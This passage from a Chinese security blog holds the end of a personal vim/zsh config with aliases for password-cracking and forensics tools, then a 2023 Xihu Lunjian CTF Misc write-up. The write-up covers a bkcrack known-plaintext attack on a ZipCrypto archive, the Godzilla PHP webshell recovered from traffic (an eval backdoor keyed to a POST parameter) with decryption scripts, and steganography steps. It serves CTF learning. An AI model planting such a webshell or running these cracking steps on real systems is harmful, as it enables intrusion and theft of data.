class="line">      \ coc#refresh()</span><br><span class="line">inoremap &lt;expr&gt;&lt;S-TAB&gt; coc#pum#visible() ? coc#pum#prev(1) : &quot;\&lt;C-h&gt;&quot;</span><br><span class="line"></span><br><span class="line">&quot; Make &lt;CR&gt; to accept selected completion item or notify coc.nvim to format</span><br><span class="line">&quot; &lt;C-g&gt;u breaks current undo, please make your own choice.</span><br><span class="line">inoremap &lt;silent&gt;&lt;expr&gt; &lt;CR&gt; coc#pum#visible() ? coc#pum#confirm()</span><br><span class="line">                              \: &quot;\&lt;C-g&gt;u\&lt;CR&gt;\&lt;c-r&gt;=coc#on_enter()\&lt;CR&gt;&quot;</span><br><span class="line"></span><br><span class="line">function! CheckBackspace() abort</span><br><span class="line">  let col = col(&#x27;.&#x27;) - 1</span><br><span class="line">  return !col || getline(&#x27;.&#x27;)[col - 1]  =~# &#x27;\s&#x27;</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line">&quot; Use &lt;c-space&gt; to trigger completion.</span><br><span class="line">if has(&#x27;nvim&#x27;)</span><br><span class="line">  inoremap &lt;silent&gt;&lt;expr&gt; &lt;c-space&gt; coc#refresh()</span><br><span class="line">else</span><br><span class="line">  inoremap &lt;silent&gt;&lt;expr&gt; &lt;c-@&gt; coc#refresh()</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line"> &quot; Highlight the symbol and its references when holding the cursor.</span><br><span class="line"> autocmd CursorHold * silent call CocActionAsync(&#x27;highlight&#x27;)</span><br><span class="line"></span><br><span class="line"> &quot; Symbol renaming.</span><br><span class="line"> nmap &lt;leader&gt;rn &lt;Plug&gt;(coc-rename)</span><br><span class="line"></span><br><span class="line"> &quot; Formatting selected code.</span><br><span class="line"> xmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span><br><span class="line"> nmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &quot; lightline.vim</span><br><span class="line"> set laststatus=2</span><br><span class="line"> set noshowmode</span><br><span class="line"></span><br><span class="line"> &quot; nerdcommenter</span><br><span class="line"> &quot; Create default mappings</span><br><span class="line"> let g:NERDCreateDefaultMappings = 1</span><br><span class="line"></span><br><span class="line"> &quot; Add spaces after comment delimiters by default</span><br><span class="line"> let g:NERDSpaceDelims = 1</span><br><span class="line"></span><br><span class="line"> &quot; Use compact syntax for prettified multi-line comments</span><br><span class="line"> let g:NERDCompactSexyComs = 1</span><br><span class="line"></span><br><span class="line"> &quot; Align line-wise comment delimiters flush left instead of following code indentation</span><br><span class="line"> let g:NERDDefaultAlign = &#x27;left&#x27;</span><br><span class="line"></span><br><span class="line"> &quot; Set a language to use its alternate delimiters by default</span><br><span class="line"> let g:NERDAltDelims_java = 1</span><br><span class="line"></span><br><span class="line"> &quot; Add your own custom formats or override the defaults</span><br><span class="line"> let g:NERDCustomDelimiters = &#123; &#x27;c&#x27;: &#123; &#x27;left&#x27;: &#x27;/**&#x27;,&#x27;right&#x27;: &#x27;*/&#x27; &#125; &#125;</span><br><span class="line"></span><br><span class="line"> &quot; Allow commenting and inverting empty lines (useful when commenting a region)</span><br><span class="line"> let g:NERDCommentEmptyLines = 1</span><br><span class="line"></span><br><span class="line"> &quot; Enable trimming of trailing whitespace when uncommenting</span><br><span class="line"> let g:NERDTrimTrailingWhitespace = 1</span><br><span class="line"></span><br><span class="line"> &quot; Enable NERDCommenterToggle to check all selected lines is commented or not</span><br><span class="line"> let g:NERDToggleCheckAllLines = 1</span><br></pre></td></tr></table></figure><h3 id="x2F-zshrc"><a href="#x2F-zshrc" class="headerlink" title="~&#x2F;.zshrc"></a><strong>~&#x2F;.zshrc</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"># 配置Proxy</span><br><span class="line">export hostip=$(cat /etc/resolv.conf | grep -oP &#x27;(?&lt;=nameserver\ ).*&#x27;)</span><br><span class="line">export wslip=$(hostname -I)</span><br><span class="line">export ALL_PROXY=&quot;socks5://$&#123;hostip&#125;:10808&quot;;</span><br><span class="line"></span><br><span class="line">setProxy() &#123;</span><br><span class="line">  export ALL_PROXY=&quot;socks5://$&#123;hostip&#125;:10808&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsetProxy() &#123;</span><br><span class="line">  unset ALL_PROXY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">checkProxy()&#123;</span><br><span class="line">  echo &quot;Host IP:&quot; $&#123;hostip&#125;</span><br><span class="line">  echo &quot;WSL IP:&quot; $&#123;wslip&#125;</span><br><span class="line">  echo &quot;Try to connect to Google...&quot;</span><br><span class="line">  resp=$(curl -I -s --connect-timeout 2 -m 2 -w &quot;%&#123;http_code&#125;&quot; -o /dev/null www.google.com)</span><br><span class="line">  if [ $&#123;resp&#125; = 200 ]; then</span><br><span class="line">    echo &quot;Proxy setup succeeded!&quot;</span><br><span class="line">  else</span><br><span class="line">    echo &quot;Proxy setup failed!&quot;</span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Added by Zinit&#x27;s installer</span><br><span class="line">if [[ ! -f $HOME/.local/share/zinit/zinit.git/zinit.zsh ]]; then</span><br><span class="line">    print -P &quot;%F&#123;33&#125; %F&#123;220&#125;Installing %F&#123;33&#125;ZDHARMA-CONTINUUM%F&#123;220&#125; Initiative Plugin Manager (%F&#123;33&#125;zdharma-continuum/zinit%F&#123;220&#125;)…%f&quot;</span><br><span class="line">    command mkdir -p &quot;$HOME/.local/share/zinit&quot; &amp;&amp; command chmod g-rwX &quot;$HOME/.local/share/zinit&quot;</span><br><span class="line">    command git clone https://github.com/zdharma-continuum/zinit &quot;$HOME/.local/share/zinit/zinit.git&quot; &amp;&amp; \</span><br><span class="line">        print -P &quot;%F&#123;33&#125; %F&#123;34&#125;Installation successful.%f%b&quot; || \</span><br><span class="line">        print -P &quot;%F&#123;160&#125; The clone has failed.%f%b&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">source &quot;$HOME/.local/share/zinit/zinit.git/zinit.zsh&quot;</span><br><span class="line">autoload -Uz _zinit</span><br><span class="line">(( $&#123;+_comps&#125; )) &amp;&amp; _comps[zinit]=_zinit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 加载插件</span><br><span class="line">zinit snippet OMZP::z</span><br><span class="line">zinit snippet OMZP::git</span><br><span class="line">zinit snippet OMZP::extract</span><br><span class="line">zinit snippet OMZT::agnoster</span><br><span class="line">zinit light zsh-users/zsh-autosuggestions</span><br><span class="line">zinit light zdharma-continuum/fast-syntax-highlighting</span><br><span class="line"></span><br><span class="line"># 按键等插件</span><br><span class="line">zinit snippet OMZ::lib/git.zsh</span><br><span class="line">zinit snippet OMZ::lib/history.zsh</span><br><span class="line">zinit snippet OMZ::lib/clipboard.zsh</span><br><span class="line">zinit snippet OMZ::lib/completion.zsh</span><br><span class="line">zinit snippet OMZ::lib/key-bindings.zsh</span><br><span class="line">zinit snippet OMZ::lib/theme-and-appearance.zsh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ------------------------------------------------------------------------</span><br><span class="line"># ------------------------------------------------------------------------</span><br><span class="line">if [ -x /usr/bin/dircolors ]; then</span><br><span class="line">    test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot;</span><br><span class="line">    alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">    #alias dir=&#x27;dir --color=auto&#x27;</span><br><span class="line">    #alias vdir=&#x27;vdir --color=auto&#x27;</span><br><span class="line"></span><br><span class="line">    alias grep=&#x27;grep --color=auto&#x27;</span><br><span class="line">    alias fgrep=&#x27;fgrep --color=auto&#x27;</span><br><span class="line">    alias egrep=&#x27;egrep --color=auto&#x27;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 配置path</span><br><span class="line">export DISPLAY=$&#123;hostip&#125;:0</span><br><span class="line">export PATH=/root/WSL/john-1.9.0-jumbo-1/run:$PATH</span><br><span class="line">export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64:$PATH</span><br><span class="line"></span><br><span class="line"># 配置快捷键</span><br><span class="line">alias cls=clear</span><br><span class="line">alias pycdc=&#x27;/root/WSL/pycdc/bin/pycdc&#x27;</span><br><span class="line">alias john=&#x27;/root/WSL/john-1.9.0-jumbo-1/run/john&#x27;</span><br><span class="line">alias john_rockyou=&#x27;/root/WSL/john-1.9.0-jumbo-1/run/john --wordlist=/usr/share/wordlists/rockyou.txt&#x27;</span><br><span class="line">alias bkcrack=&#x27;/root/WSL/bkcrack-1.5.0-Linux/bkcrack&#x27;</span><br><span class="line">alias vol.py3=&#x27;python3 /root/WSL/volatility3/vol.py&#x27;</span><br><span class="line"></span><br><span class="line">alias lsb=&#x27;python2 /root/WSL/cloacked-pixel/lsb.py&#x27;</span><br><span class="line">alias tsteg=&#x27;python3 /root/WSL/tsteg/tsteg.py&#x27;</span><br><span class="line">alias water=&#x27;python2 /root/WSL/blind-watermark-python2/decode.py&#x27;</span><br><span class="line">alias water2=&#x27;python2 /root/WSL/BlindWaterMark/bwm.py&#x27;</span><br><span class="line">alias water3=&#x27;python3 /root/WSL/BlindWaterMark/bwmforpy3.py&#x27;</span><br><span class="line"></span><br><span class="line">alias knm=&#x27;python3 /root/WSL/knm/knm.py&#x27;</span><br><span class="line"># ------------------------------------------------------------------------</span><br><span class="line"># ------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑2023-Misc-WriteUp</title>
      <link href="/posts/20175.html"/>
      <url>/posts/20175.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Misc-1"><a href="#1-Misc-1" class="headerlink" title="1.Misc-1"></a>1.Misc-1</h1><p>签到没什么好说的了</p><p><code>欢迎~DASCTF&#123;W3lc0m3_t0_GCSIS_2023&#125;~只需要提交括号内的字符串即可</code></p><br><h1 id="2-Misc-2"><a href="#2-Misc-2" class="headerlink" title="2.Misc-2"></a>2.Misc-2</h1><ol><li>因为是<code>ZipCrypto Store</code>，只能说一眼明文攻击，想要进阶的话看补充</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202133344068.png" alt="image-20230202133344068"></p><ol start="2"><li>攻击手法如下：</li></ol><p>首先新建一个 <code>plain.out</code> 内容如下：（这个内容是zip的文件尾结构）</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202133522832.png" alt="image-20230202133522832"></p><p><code>.\bkcrack.exe -C zipeasy.zip -c dasflow.zip -p plain.out -o 502393 -x 0 504B030414000000</code></p><p>参数解释：</p><p><code>-o 502393</code>  根据zip字节大小，<code>502415 - 22 = 502393</code></p><p><code>-x 0 504B030414000000</code> 偏移字节，也就是说<code>504B030414000000</code> 这些字节在攻击的时候是从0字节开始，也就是zip的头部开始</p><p>花费了24分钟，终于拿到了key</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2023-02-02_12-27-44.png" alt="Snipaste_2023-02-02_12-27-44"></p><p>修改压缩包密码命令：<code>bkcrack -C zipeasy.zip -k 2b7d78f3 0ebcabad a069728c -U easy.zip easy</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2023-02-02_12-34-01.png" alt="Snipaste_2023-02-02_12-34-01"></p><br><ol start="3"><li>压缩包密码已经被改为了<code>easy</code>，解压压缩包得到文件 <code>dasflow.pcapng</code>，打开分析</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202134336236.png" alt="image-20230202134336236"></p><p>过滤器设置为<code>http</code>，在<code>426</code>可以找到<code>php脚本</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="title function_ invoke__">session_start</span>(); </span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); </span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;air123&#x27;</span>; </span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>; </span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;d8ea7326e6ec5916&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123; </span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>); </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123; </span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123; </span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>); </span><br><span class="line">        &#125; </span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$payload</span>); </span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>); </span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>)); </span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123; </span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>百度搜索一下，关键代码，能知道是哥斯拉流量，还能找到解密代码，下载一个<code>php</code>，我这边<code>php</code>版本为8.2.2</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202134615434.png" alt="image-20230202134615434"></p><br><ol start="4"><li>为了更快定位到关键流量，修改过滤器为<code>http.request.full_uri contains &quot;eval.php&quot; or http.response_for.uri contains &quot;eval.php&quot;</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202135002538.png" alt="image-20230202135002538"></p><p>然后就是使用下面的代码一个一个的解，如果遇到了不是标准的<code>base64</code>就要把前面的16位和后面的16位去掉</p><p>当我过滤到<code>1127</code>的请求的时候，就发现了关键信息了</p><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="title function_ invoke__">session_start</span>(); </span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); </span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;air123&#x27;</span>; </span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>; </span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;d8ea7326e6ec5916&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="string">&quot;ca19adef3b7a8ce7J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOqa0EPMTZkb2e56eb02f8c2a4d&quot;</span>,<span class="number">16</span>, -<span class="number">16</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&#x27;J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzdecode</span>(<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>), <span class="variable">$key</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202135054733.png" alt="image-20230202135054733"></p><p>得到了密码：<code>airDAS1231qaSW@</code></p><br><ol start="5"><li>然后我们开始导出<code>flag.zip</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202135326827.png" alt="image-20230202135326827"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202135357811.png" alt="image-20230202135357811"></p><p>使用密码解压得到flag</p><p><strong>DASCTF{7892a81d23580e4f3073494db431afc5}</strong></p><br><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>这边又手写了一个python的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">D, K</span>):</span><br><span class="line">D = <span class="built_in">list</span>(D)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(D)):</span><br><span class="line">c = K[i + <span class="number">1</span> &amp; <span class="number">15</span>]</span><br><span class="line">D[i] = D[i] ^ c</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bytes</span>(D)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;d8ea7326e6ec5916&quot;</span></span><br><span class="line">cipher_text = <span class="string">&quot;J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3&quot;</span></span><br><span class="line"></span><br><span class="line">out = encode(base64.b64decode(cipher_text), key)</span><br><span class="line"><span class="built_in">print</span>(gzip.decompress(out))</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;cmdLine\x02P\x00\x00\x00sh -c &quot;cd &quot;/var/www/html/upload/&quot;;zip -o flag.zip /flag -P airDAS1231qaSW@&quot; 2&gt;&amp;1methodName\x02\x0b\x00\x00\x00execCommand&#x27;</span><br></pre></td></tr></table></figure><h2 id="加快明文攻击补充："><a href="#加快明文攻击补充：" class="headerlink" title="加快明文攻击补充："></a>加快明文攻击补充：</h2><p><code>bkcrack -C zipeasy.zip -c dasflow.zip -p plain.out -o 502393 -x 0 504B030414000000 -x 30 646173666C6F772E706361706E67</code></p><p>这个命令我的电脑4分钟出结果</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202194354029.png" alt="image-20230202194354029"></p><p>参数解释：</p><p>这个是zip的尾部的字节分布情况：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202200925563.png" alt="image-20230202200925563"></p><p><code>-p plain.out -o 502393</code>：plain.out还是之前的文件尾部，文件尾部可以利用8字节，但是要注意，要看被攻击的zip有没有注释，如果有注释，那偏移肯定不对了。（实在不理解，你手动加密一个zip，一个有注释一个没有注释就知道了）</p><p><code>-x 0 504B030414000000</code>：根据正常情况能利用的只有4字节<code>50 4B 03 04</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202194721663.png" alt="image-20230202194721663"></p><p>关于生蚝同学的疑问，我这边的解释是，当时攻击很慢，为了加快速度，我就猜他是没有加密的</p><p><code>-x 30 646173666C6F772E706361706E67</code>：这个地方14个字节统统能利用，因为这个是zip里面的第一个被压缩的文件，他的文件名的位置，也就是<code>dasflow.pcapng</code></p><p>为什么是<code>dasflow.pcapng</code>？</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202195323725.png" alt="image-20230202195323725"></p><p>因为你压缩<code>dasflow.pcapng</code>就会得到<code>dasflow.zip</code>，所以就大胆猜测嘛！</p><p><strong>攻击的条件：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击需要至少 12 个字节的已知明文。其中至少有 8 个必须是连续的。连续的已知明文越大，攻击越快。</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一种情况：</span><br><span class="line">当你可以利用文件的名称的时候，攻击命令为`-x 30 &lt;hex_str&gt;`（也就是偏移30）</span><br><span class="line"></span><br><span class="line">第二种情况：</span><br><span class="line">当你实在没有办法了，你就利用尾部的8字节`50 4B 05 06 00 00 00 00`，看我已经凑齐了连续的8字节了吧。</span><br><span class="line">再加上zip文件头的4字节`50 4B 03 04`，也就是12字节喽！</span><br><span class="line">（当然也可以学我奔放一点就猜他没有加密，不然速度太慢了emmm..但是如果奔放一点没出来结果，我们就低调一点，就老实凑12字节喽~）</span><br></pre></td></tr></table></figure><br><h1 id="3-Misc-3"><a href="#3-Misc-3" class="headerlink" title="3.Misc-3"></a>3.Misc-3</h1><ol><li>看到mp3，先使用<code>mp3stego</code>试试</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202140952996.png" alt="image-20230202140952996"></p><p>得到<code>cipher.txt</code>，打开得到 <code>8750d5109208213f</code></p><ol start="2"><li><code>foremost</code> 分离一下<code>cipher.mp3</code>，得到了一张png</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202142125971.png" alt="image-20230202142125971"></p><ol start="3"><li>先用zsteg看一下，发现了zip，导出zip</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202142115460.png" alt="image-20230202142115460"></p><ol start="4"><li>使用之前得到的<code>8750d5109208213f</code>解压zip，得到<code>47.txt</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202142230228.png" alt="image-20230202142230228"></p><ol start="5"><li>根据<code>47</code>猜测是<code>rot47</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202142300068.png" alt="image-20230202142300068"></p><ol start="6"><li>很像javascript，使用浏览器的console，得到了flag</li></ol><p>为什么说像JavaScript，是因为之前看过一期视频：<a 